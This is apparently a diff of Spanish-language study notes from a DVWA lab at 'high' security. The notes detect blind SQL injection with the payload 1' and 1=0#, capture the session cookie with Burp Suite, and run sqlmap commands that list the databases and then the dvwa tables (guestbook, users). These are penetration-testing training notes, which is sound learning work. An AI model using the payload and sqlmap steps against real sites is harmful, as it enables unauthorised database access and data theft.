@@ -1,2 +1,25 @@
 ++ Web Browser
 --- dvwa security = high
+--- SQL Injection Blind ---> click here to change your id ---> se abrirá una 
+nueva ventana ---> 1 ---> submit ---> En la ventana original nos aparece que 
+el user id 1 si existe ---> 1' and 1=0# ---> submit ---> En la ventana original 
+aparece el mensaje de que el user ID no se encuentra
+--- Este comportamiento en el cual la ventana original se comporta
+distinto nos permite inferir que la página es vulnerable a un ataque del tipo
+sql blind injection
+
+++ Burp Suite (Nos permite tener la información del cookie y la post data)
+--- Intercept on
+
+++ Web Browser
+--- --- SQL Injection Blind ---> click here to change your id ---> se abrirá una 
+nueva ventana ---> 1 ---> submit 
+
+++ SQL map
+--- sql map -u <"url_ventana_principal"> --cookie=<"cookie_encontrada_por_burp"> --data="id=1&Submit=Submit" --dbs 
+--- Nos aparecerán las bases de datos asociadas (dvwa e information schema)
+--- A continuación enumeramos las tablas dentro de la base de datos dvwa mediante el siguiente comando:
+---- sql map -u <"url_ventana_principal"> --cookie=<"cookie_encontrada_por_burp"> --data="id=1&Submit=Submit" -D dvwa --tables 
+---- Nos aparecen las tablas asociadas: guestbook y users
+
+
